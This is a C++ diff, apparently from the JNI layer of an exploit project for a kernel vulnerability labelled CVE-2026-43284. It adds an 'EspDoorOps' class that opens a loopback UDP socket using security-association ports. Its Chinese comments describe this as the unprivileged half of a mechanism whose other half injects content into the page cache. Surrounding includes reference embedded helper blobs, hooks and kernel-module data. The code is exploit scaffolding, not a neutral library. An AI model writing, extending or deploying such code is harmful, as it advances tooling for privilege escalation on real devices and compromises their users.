@@ -10,13 +10,18 @@
 #include <cstddef>
 #include <cstdint>
 #include <span>
+#include <arpa/inet.h>
 #include <fcntl.h>
+#include <memory>
+#include <netinet/in.h>
+#include <sys/socket.h>
 #include <unistd.h>
 #include <string>
 
 #include "backend/cve_2026_43284/embed/libcxx_blob.hpp"
 #include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
 #include "backend/cve_2026_43284/hook/sentry_hook.hpp"
+#include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
 #include "backend/cve_2026_43284/access_params.hpp"
 #include "backend/cve_2026_43284/lkm/module_facts.hpp"
 #include "jni/api_43284.hpp"
@@ -141,7 +146,72 @@ namespace ghostlock::jni {
         }
     }
 
-    backend::cve_2026_43284::SaMaterial sa_material_of(const Init43284Values &params) noexcept {
+        /**
+     *  设备侧的 DoorOps：两扇门里本进程能开的那一半。
+     *
+     *  - open_target：把调用方递进来的 fd 交出去（本对象不拥有它 —— 谁开的门谁关）；
+     *  - connect_esp：按 SaMaterial 的端口建 UDP socket（发送端绑 sender_port，连到 encap_port）；
+     *  - close_fd：只关自己开的那个（ESP socket），递进来的不碰；
+     *  - target_is_remote：恒为 false（remote 载体由 bridge 读）。
+     *
+     *  这一半不需要设备权限，宿主上可测；真正把内容注入页缓存的那一半在窗口里。
+     */
+    class EspDoorOps final : public backend::cve_2026_43284::landing::DoorOps {
+      public:
+        explicit EspDoorOps(const int handed_in_fd) noexcept : handed_in_(handed_in_fd) {}
+        ~EspDoorOps() noexcept override {
+            if (esp_fd_ >= 0) {
+                static_cast<void>(::close(esp_fd_));
+            }
+        }
+
+        [[nodiscard]] int open_target() noexcept override { return handed_in_; }
+
+        [[nodiscard]] int connect_esp(
+            const backend::cve_2026_43284::SaMaterial &sa) noexcept override {
+            const int fd = ::socket(AF_INET, SOCK_DGRAM, 0);
+            if (fd < 0) {
+                return -1;
+            }
+            sockaddr_in local{};
+            local.sin_family = AF_INET;
+            local.sin_addr.s_addr = ::htonl(INADDR_LOOPBACK);
+            local.sin_port = ::htons(sa.sender_port);
+            if (::bind(fd, reinterpret_cast<sockaddr *>(&local), sizeof(local)) != 0) {
+                static_cast<void>(::close(fd));
+                return -1;
+            }
+            sockaddr_in peer{};
+            peer.sin_family = AF_INET;
+            peer.sin_addr.s_addr = ::htonl(INADDR_LOOPBACK);
+            peer.sin_port = ::htons(sa.encap_port);
+            if (::connect(fd, reinterpret_cast<sockaddr *>(&peer), sizeof(peer)) != 0) {
+                static_cast<void>(::close(fd));
+                return -1;
+            }
+            esp_fd_ = fd;
+            return fd;
+        }
+
+        void close_fd(const int fd) noexcept override {
+            if (fd >= 0 && fd != handed_in_) {
+                static_cast<void>(::close(fd));
+            }
+        }
+
+        [[nodiscard]] bool target_is_remote() const noexcept override { return false; }
+
+      private:
+        int handed_in_ = -1;
+        int esp_fd_ = -1;
+    };
+
+    /** @return 给宿主测试用的 ESP 门实现（递进来的 fd 由调用方拥有）。 */
+    std::unique_ptr<backend::cve_2026_43284::landing::DoorOps> make_esp_door_ops(const int handed_in_fd) noexcept {
+        return std::make_unique<EspDoorOps>(handed_in_fd);
+    }
+
+backend::cve_2026_43284::SaMaterial sa_material_of(const Init43284Values &params) noexcept {
         backend::cve_2026_43284::SaMaterial sa{};
         sa.spi = static_cast<std::uint32_t>(params.spi);
         sa.encap_port = static_cast<std::uint16_t>(params.encapPort);
